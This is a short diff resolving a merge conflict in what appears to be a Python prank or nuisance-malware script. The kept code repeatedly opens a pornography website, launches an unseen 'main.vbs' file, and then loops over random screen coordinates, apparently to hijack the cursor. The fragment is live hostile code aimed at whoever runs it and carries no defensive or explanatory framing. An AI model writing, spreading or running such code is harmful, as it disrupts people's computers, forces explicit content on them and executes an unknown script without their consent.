@@ -31,16 +31,8 @@ def main():
     a=0
     while a < 10:
         subprocess.getoutput('explorer https://pornhub.com')
-<<<<<<< HEAD
-        try:
-            subprocess.getoutput("start main.vbs")
-        except FileNotFoundError:
-            continue
-    i=0
-=======
         subprocess.getoutput("start main.vbs")
         a += 1
->>>>>>> 830cdb3e60d69637204ffe699c683293a2395cb2
     for i in range(0, 150):
         rndvalueX = randint(0, 1919)
         rndvalueY = randint(0,1019)
